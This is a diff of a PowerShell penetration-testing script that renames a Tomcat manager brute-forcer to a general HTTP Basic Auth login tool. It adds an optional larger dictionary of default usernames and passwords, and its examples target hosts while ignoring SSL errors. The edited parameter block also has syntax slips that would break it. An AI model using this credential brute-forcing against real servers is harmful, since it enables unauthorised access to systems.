@@ -1,10 +1,12 @@
 ﻿<#
  	.SYNOPSIS
-	   This script attempts to login with default Tomcat Username and credentials using
-       a brute force attack. Tomcat by default ships with very easy to guess manager interface
-       passwords, and the manager interface is rarely turned off.
+	This script attempts to login to basic authentication with default HTTP Basic Auth Credentials.
+	The dictionary and configuration by default is set to attempt to loging to Tomcat servers
+	using a dictionary of default usernames and passwords. This can be configurable in the parameters.
+        Tomcat by default ships with very easy to guess manager interface passwords, and the manager 
+        interface is rarely disabled..
 
-	Function: Invoke-TomcatLogin
+	Function: Invoke-HTTPBasicAuthLogin
 	Author: Matt Kelly
 	Required Dependencies: PSv3
 
@@ -20,7 +22,7 @@
 
 	Supply the username if testing custom, otherwise defaults to custom list.
 
-    .PARAMETER Password
+    	.PARAMETER Password
 
 	Supply the username if testing custom, otherwise defaults to custom list.
 
@@ -28,14 +30,17 @@
 
 	Supply the URI to test, defaults to /manager/html/.
 
-    .PARAMETER IgnoreSSL
+    	.PARAMETER IgnoreSSL
 
 	Ignore bad SSL certificates switch -IgnoreSSL.
+	
+	.PARAMETER BigDictionary
+	Use the larger dictionary by default.
 		
 	.EXAMPLE
 
 	Execute on a single host using the default builtin database:
-	Invoke-TomcatLogin -Computer 192.168.1.10:8080
+	Invoke-HTTPBasicAuthLogin -Computer 192.168.1.10:8080
 
     [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,admin
     [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,admin
@@ -50,12 +55,12 @@
 	.EXAMPLE
 
 	Brute force Tomcat manager login on a single host ignoring SSL:
-	Invoke-TomcatLogin -Computer 192.168.1.10:8443 -IgnoreSSL
+	Invoke-HTTPBasicAuthLogin -Computer 192.168.1.10:8443 -IgnoreSSL
 	  
 	.EXAMPLE
 
 	Brute force Tomcat manager login on a list of hosts ignoring SSLL:
-	Invoke-TomcatLogin -File C:\Temp\Hosts.txt -IgnoreSSL
+	Invoke-HTTPBasicAuthLogin -File C:\Temp\Hosts.txt -IgnoreSSL
 	
 #>
 [CmdletBinding(DefaultParameterSetName="AnonymousEnumeration")]
@@ -78,10 +83,13 @@ Param(
 		HelpMessage='Optionally provide the user password if performing authenticated enumeration')]
 		[string]$Password,
 
-	    [Parameter(ParameterSetName = "IgnoreSSL")]
+	    	[Parameter(ParameterSetName = "IgnoreSSL")]
 		[switch]$IgnoreSSL,
+		
+		[Parameter(ParameterSetName = BigDictionary)]
+		[switch]$BigDictionary
 
-        [Parameter(Mandatory=$false,
+        	[Parameter(Mandatory=$false,
 		HelpMessage='Optionally provide the user password if performing authenticated enumeration')]
 		[string]$URIPath = "/manager/html"
 	)
@@ -90,13 +98,13 @@ Function Invoke-TomcatLogin
 #Build arrays of default usernames and passwords, passwords based of many lists including Metasploit and custom
 if(!$UserName)
 {
-    #big = [array]$UserName = "admin","tomcat","administrator","manager","j2deployer","ovwebusr","cxsdk","root","xampp","ADMIN","testuser"
-    [array]$UserName = "admin","tomcat","administrator","manager","j2deployer"
+    if ($BigDictionary) { [array]$UserName = "admin","tomcat","administrator","manager","j2deployer","ovwebusr","cxsdk","root","xampp","ADMIN","testuser" }
+    else { [array]$UserName = "admin","tomcat","administrator","manager","j2deployer" }
 }
 if (!$Password)
 {
-    #big = [array]$Password = "","admin","password","tomcat","manager","j2deployer","OvW*busr1","kdsxc","owaspbwa","ADMIN","xampp","s3cret","Password1","testuser","redi_123"
-    [array]$Password = "","admin","password","tomcat","manager","j2deployer"
+    if ($BigDictionary) { [array]$Password = "","admin","password","tomcat","manager","j2deployer","OvW*busr1","kdsxc","owaspbwa","ADMIN","xampp","s3cret","Password1","testuser","redi_123" }
+    else { [array]$Password = "","admin","password","tomcat","manager","j2deployer" }
 }
 #Ignore SSL From http://connect.microsoft.com/PowerShell/feedback/details/419466/new-webserviceproxy-needs-force-parameter-to-ignore-ssl-errors thanks @Mattifestation and HaIR
 if ($IgnoreSSL)
